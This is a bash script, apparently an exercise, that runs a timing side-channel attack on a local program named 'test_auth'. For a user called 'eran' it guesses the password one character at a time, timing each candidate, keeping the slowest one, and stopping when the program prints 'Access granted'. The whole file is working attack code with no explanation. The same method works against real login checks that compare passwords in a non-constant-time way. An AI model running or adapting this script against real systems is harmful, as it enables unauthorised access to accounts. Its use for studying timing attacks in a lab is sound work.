USERNAME="eran"
PASSWORD=""
CHARS="abcdefghijklmnopqrstuvwxyz0123456789"
URL="./test_auth"
TRIES=3

for ((i=0; i<10; i++)); do
    best_char=""
    max_time=0

    for c in $(echo "$CHARS" | fold -w1); do
        try="$PASSWORD$c"
        total=0

        for attempt in $(seq 1 $TRIES); do
            start=$(date +%s.%N)
            output=$(printf "3\n%s\n%s\n" "$USERNAME" "$try" | $URL)
            end=$(date +%s.%N)
            elapsed=$(echo "$end - $start" | bc -l)
            total=$(echo "$total + $elapsed" | bc -l)
        done

        avg_time=$(echo "$total / $TRIES" | bc -l)
        printf "Trying %-10s → %.6f sec\n" "$try" "$avg_time"

        if (( $(echo "$avg_time > $max_time" | bc -l) )); then
            max_time=$avg_time
            best_char=$c
        fi
    done

    PASSWORD+=$best_char
    echo "Best guess so far: $PASSWORD"

    output=$(printf "3\n%s\n%s\n" "$USERNAME" "$PASSWORD" | $URL)
    if echo "$output" | grep -q "Access granted"; then
        echo "Guessed password: $PASSWORD"
        exit 0
    fi
done

echo "Failed to guess full password after 10 characters: $PASSWORD"
